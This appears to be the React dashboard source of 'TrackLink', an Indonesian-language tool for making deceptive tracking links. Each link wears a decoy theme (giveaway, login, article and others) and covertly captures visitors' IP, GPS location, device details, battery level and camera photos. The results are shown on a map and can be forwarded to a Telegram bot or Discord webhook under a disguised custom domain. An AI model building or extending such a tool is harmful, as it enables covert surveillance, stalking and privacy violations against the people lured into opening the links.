import { useState } from 'react';
import { getLinks, createLink, deleteLink, clearLinks, getSettings, saveSettings } from '../storage';

const DECOY_THEMES = [
  { key: 'article',  label: 'Artikel' },
  { key: 'giveaway', label: 'Giveaway' },
  { key: 'video',    label: 'Video' },
  { key: 'download', label: 'Download' },
  { key: 'survey',   label: 'Survey' },
  { key: 'login',    label: 'Login' },
];

const FEATURES = [
  { key: 'trackIp',      label: 'IP & Lokasi' },
  { key: 'trackDevice',  label: 'Perangkat' },
  { key: 'trackBattery', label: 'Baterai' },
  { key: 'trackCamera',  label: 'Kamera' },
];

export default function Dashboard() {
  const [links, setLinks] = useState(() => getLinks());
  const [linkName, setLinkName] = useState('');
  const [decoy, setDecoy] = useState('article');
  const [feats, setFeats] = useState({ trackIp: true, trackDevice: true, trackBattery: true, trackCamera: false });
  const [genUrl, setGenUrl] = useState(null);
  const [copied, setCopied] = useState(false);
  const [expandedId, setExpandedId] = useState(null);
  const [photoModal, setPhotoModal] = useState(null);
  const [showSettings, setShowSettings] = useState(false);
  const [settings, setSettings] = useState(() => getSettings());
  const [settingsSaved, setSettingsSaved] = useState(false);


  // Gunakan custom domain jika diset di settings, fallback ke Vercel URL
  const base = (settings.customDomain || '').replace(/\/+$/, '') || window.location.origin;
  const totalCaptures = links.reduce((a, l) => a + (l.captures?.length || 0), 0);

  function toggleFeat(k) {
    setFeats(p => ({ ...p, [k]: !p[k] }));
  }

  function handleCreate() {
    const link = createLink({ name: linkName.trim() || undefined, decoyTheme: decoy, ...feats });
    setLinks(getLinks());
    setGenUrl(`${base}/t/${link.encoded}`);
    setLinkName('');
    setExpandedId(link.id);
  }

  function handleCopy(url) {
    navigator.clipboard.writeText(url);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function handleDelete(id, e) {
    e.stopPropagation();
    deleteLink(id);
    setLinks(getLinks());
    if (expandedId === id) setExpandedId(null);
    if (genUrl?.includes(id)) setGenUrl(null);
  }

  function handleClear() {
    if (!confirm('Hapus semua link?')) return;
    clearLinks();
    setLinks([]);
    setGenUrl(null);
    setExpandedId(null);
  }

  function handleSaveSettings() {
    saveSettings(settings);
    setSettingsSaved(true);
    setTimeout(() => setSettingsSaved(false), 2000);
  }

  function handleLogout() {
    sessionStorage.removeItem('tl_auth');
    window.location.reload();
  }

  return (
    <div className="app">
      {/* Header */}
      <header className="header">
        <div className="header-logo">
          <div className="header-logo-mark">🎯</div>
          <span className="header-logo-name">TrackLink</span>
        </div>
        <div className="header-divider" />
        <div className="header-nav">
          <button className="nav-btn active">Dashboard</button>
        </div>
        <div className="header-actions">
          <span className="header-stat-pill">
            <strong>{links.length}</strong> link · <strong>{totalCaptures}</strong> capture
          </span>
          <button
            className={`icon-btn ${showSettings ? 'active' : ''}`}
            onClick={() => setShowSettings(s => !s)}
            title="Pengaturan"
          >
            ⚙
          </button>
          <button className="icon-btn" onClick={handleLogout} title="Keluar">
            ↩
          </button>
        </div>
      </header>

      {/* Settings Panel */}
      {showSettings && (
        <div className="settings-panel">
          <div className="settings-inner">

            {/* Custom Domain */}
            <div className="settings-block">
              <div className="settings-block-title">
                🌐 Domain Link
                <span className="settings-help" style={{ cursor: 'default' }}>
                  Domain yang tampil di link tracking
                </span>
              </div>
              <div className="settings-row">
                <input
                  className="settings-input"
                  placeholder="Kosongkan = pakai Vercel URL otomatis"
                  value={settings.customDomain || ''}
                  onChange={e => setSettings(s => ({ ...s, customDomain: e.target.value.trim() }))}
                />
              </div>
              <div className="settings-hint">
                Contoh: <code>https://beritaviral.my.id</code> atau <code>https://s.id</code>
                &nbsp;— Setelah simpan, link baru akan pakai domain ini
              </div>
            </div>

            {/* Telegram */}
            <div className="settings-block">
              <div className="settings-block-title">
                Telegram Bot
                <a href="https://t.me/BotFather" target="_blank" rel="noreferrer" className="settings-help">
                  Cara buat ↗
                </a>
              </div>
              <div className="settings-row">
                <input
                  className="settings-input"
                  placeholder="Bot Token: 7123456789:AAH..."
                  value={settings.telegramToken || ''}
                  onChange={e => setSettings(s => ({ ...s, telegramToken: e.target.value.trim() }))}
                />
                <input
                  className="settings-input"
                  placeholder="Chat ID: 123456789"
                  value={settings.telegramChatId || ''}
                  onChange={e => setSettings(s => ({ ...s, telegramChatId: e.target.value.trim() }))}
                />
              </div>
              <div className="settings-hint">
                Kirim /start ke bot → buka{' '}
                <a href="#" onClick={e => e.preventDefault()}>api.telegram.org/bot{'{TOKEN}'}/getUpdates</a>
                {' '}→ lihat chat.id
              </div>
            </div>

            {/* Discord */}
            <div className="settings-block">
              <div className="settings-block-title">
                Discord Webhook
                <a href="https://support.discord.com/hc/en-us/articles/228383668" target="_blank" rel="noreferrer" className="settings-help">
                  Cara buat ↗
                </a>
              </div>
              <div className="settings-row">
                <input
                  className="settings-input"
                  placeholder="https://discord.com/api/webhooks/..."
                  value={settings.discordWebhook || ''}
                  onChange={e => setSettings(s => ({ ...s, discordWebhook: e.target.value.trim() }))}
                />
              </div>
            </div>

            <div className="settings-save-row">
              <button className="btn btn-primary" onClick={handleSaveSettings}>
                {settingsSaved ? '✓ Tersimpan' : 'Simpan'}
              </button>
            </div>
          </div>

        </div>
      )}

      {/* Main */}
      <main className="main">
        {/* Create */}
        <div className="create-box">
          <div className="create-row">
            <input
              className="input"
              placeholder="Nama link (opsional)"
              value={linkName}
              onChange={e => setLinkName(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && handleCreate()}
            />
            <button className="btn btn-primary" onClick={handleCreate}>Buat Link</button>
          </div>

          <div className="create-label">Tampilan halaman</div>
          <div className="decoy-row">
            {DECOY_THEMES.map(t => (
              <button
                key={t.key}
                className={`decoy-chip ${decoy === t.key ? 'active' : ''}`}
                onClick={() => setDecoy(t.key)}
              >
                {t.label}
              </button>
            ))}
          </div>

          <div className="create-label">Data yang dikumpulkan</div>
          <div className="features-row">
            {FEATURES.map(f => (
              <button
                key={f.key}
                className={`feat-chip ${feats[f.key] ? 'on' : ''}`}
                onClick={() => toggleFeat(f.key)}
              >
                {feats[f.key] && <div className="feat-dot" />}
                {f.label}
              </button>
            ))}
          </div>

          {genUrl && (
            <div className="gen-link-box">
              <span className="gen-link-url">{genUrl}</span>
              <button
                className={`btn-copy ${copied ? 'copied' : ''}`}
                onClick={() => handleCopy(genUrl)}
              >
                {copied ? '✓ Disalin' : 'Salin'}
              </button>
            </div>
          )}
        </div>

        {/* Links Table */}
        <div className="links-wrap">
          <div className="links-toolbar">
            <span className="s-title">Link Tersimpan</span>
            {links.length > 0 && (
              <button className="btn btn-danger" onClick={handleClear}>Hapus semua</button>
            )}
          </div>

          {links.length === 0 ? (
            <div className="empty">
              <div className="empty-icon">↑</div>
              <div className="empty-text">Buat link pertama di atas</div>
            </div>
          ) : (
            <table className="link-table">
              <thead>
                <tr>
                  <th>Nama</th>
                  <th>URL</th>
                  <th>Tema</th>
                  <th>Fitur</th>
                  <th>Capture</th>
                  <th></th>
                </tr>
              </thead>
              <tbody>
                {links.map(link => (
                  <>
                    <tr
                      key={link.id}
                      className={`link-row ${expandedId === link.id ? 'expanded' : ''}`}
                      onClick={() => setExpandedId(expandedId === link.id ? null : link.id)}
                    >
                      <td>
                        <div className="link-name">{link.name}</div>
                        <div className="link-id">{link.id}</div>
                      </td>
                      <td>
                        <span
                          className="link-url-cell"
                          onClick={e => { e.stopPropagation(); handleCopy(`${base}/t/${link.encoded}`); }}
                          title="Klik untuk salin"
                        >
                          {base}/t/{link.encoded?.slice(0, 16)}...
                        </span>
                      </td>
                      <td><span className="theme-tag">{link.decoyTheme || 'article'}</span></td>
                      <td>
                        <div className="feat-tags">
                          {link.options?.trackIp && <span className="feat-tag">IP</span>}
                          {link.options?.trackDevice && <span className="feat-tag">Dev</span>}
                          {link.options?.trackBattery && <span className="feat-tag">Bat</span>}
                          {link.options?.trackCamera && <span className="feat-tag">Cam</span>}
                        </div>
                      </td>
                      <td>
                        <span className="badge badge-count">{link.captures?.length || 0}</span>
                      </td>
                      <td>
                        <button className="btn btn-danger" style={{ padding: '4px 10px', fontSize: '12px' }} onClick={e => handleDelete(link.id, e)}>
                          ✕
                        </button>
                      </td>
                    </tr>
                    {expandedId === link.id && (link.captures?.length || 0) > 0 && (
                      <tr key={`${link.id}-exp`}>
                        <td colSpan={6} style={{ padding: 0 }}>
                          <div className="capture-panel-inner">
                            <div className="capture-panel-title">
                              {link.captures.length} capture
                            </div>
                            {link.captures.map((cap, i) => (
                              <CaptureCard key={cap.id || i} cap={cap} onPhoto={setPhotoModal} />
                            ))}
                          </div>
                        </td>
                      </tr>
                    )}
                    {expandedId === link.id && (link.captures?.length || 0) === 0 && (
                      <tr key={`${link.id}-empty`}>
                        <td colSpan={6} style={{ padding: 0 }}>
                          <div className="capture-panel-inner">
                            <div className="capture-panel-title">Belum ada capture</div>
                          </div>
                        </td>
                      </tr>
                    )}
                  </>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </main>

      {photoModal && (
        <div className="modal-overlay" onClick={() => setPhotoModal(null)}>
          <img className="modal-img" src={photoModal} alt="capture" onClick={e => e.stopPropagation()} />
          <button className="modal-close" onClick={() => setPhotoModal(null)}>✕</button>
        </div>
      )}
    </div>
  );
}

function CaptureCard({ cap, onPhoto }) {
  const src = cap.locationSource || 'IP';
  return (
    <div className="capture-card">
      <div className="capture-grid">
        {cap.ip && (
          <div className="cap-field">
            <div className="cap-label">IP</div>
            <div className="cap-value mono">{cap.ip}</div>
          </div>
        )}
        {cap.country && (
          <div className="cap-field">
            <div className="cap-label">
              Lokasi &nbsp;
              <span className={src === 'GPS' ? 'badge badge-gps' : 'badge badge-ip'}>
                {src === 'GPS' ? `GPS ±${cap.gpsAccuracy}m` : 'IP'}
              </span>
            </div>
            <div className="cap-value">{[cap.city, cap.region, cap.country].filter(Boolean).join(', ')}</div>
          </div>
        )}
        {cap.isp && (
          <div className="cap-field">
            <div className="cap-label">ISP</div>
            <div className="cap-value" style={{ fontSize: '12px' }}>{cap.isp}</div>
          </div>
        )}
        {cap.lat && (
          <div className="cap-field">
            <div className="cap-label">Koordinat</div>
            <a
              className="cap-link"
              href={`https://www.google.com/maps/place/${Number(cap.lat).toFixed(6)},${Number(cap.lon).toFixed(6)}/@${Number(cap.lat).toFixed(6)},${Number(cap.lon).toFixed(6)},15z`}
              target="_blank"
              rel="noreferrer"
            >
              {Number(cap.lat).toFixed(5)}, {Number(cap.lon).toFixed(5)} ↗
            </a>
          </div>
        )}

        {cap.device && (
          <div className="cap-field">
            <div className="cap-label">Perangkat</div>
            <div className="cap-value" style={{ fontSize: '12px' }}>{cap.device}</div>
          </div>
        )}
        {cap.os && (
          <div className="cap-field">
            <div className="cap-label">OS / Browser</div>
            <div className="cap-value" style={{ fontSize: '12px' }}>{cap.os} — {cap.browser}</div>
          </div>
        )}
        {cap.battery !== undefined && cap.battery !== null && (
          <div className="cap-field">
            <div className="cap-label">Baterai</div>
            <div className="cap-value">{Math.round(cap.battery * 100)}%{cap.charging ? ' ⚡' : ''}</div>
          </div>
        )}
        {cap.photo && (
          <div className="cap-field">
            <div className="cap-label">Foto</div>
            <img className="cap-photo" src={cap.photo} alt="cap" onClick={() => onPhoto(cap.photo)} />
          </div>
        )}
      </div>
      <div className="cap-time">{new Date(cap.at).toLocaleString('id-ID')}</div>
    </div>
  );
}
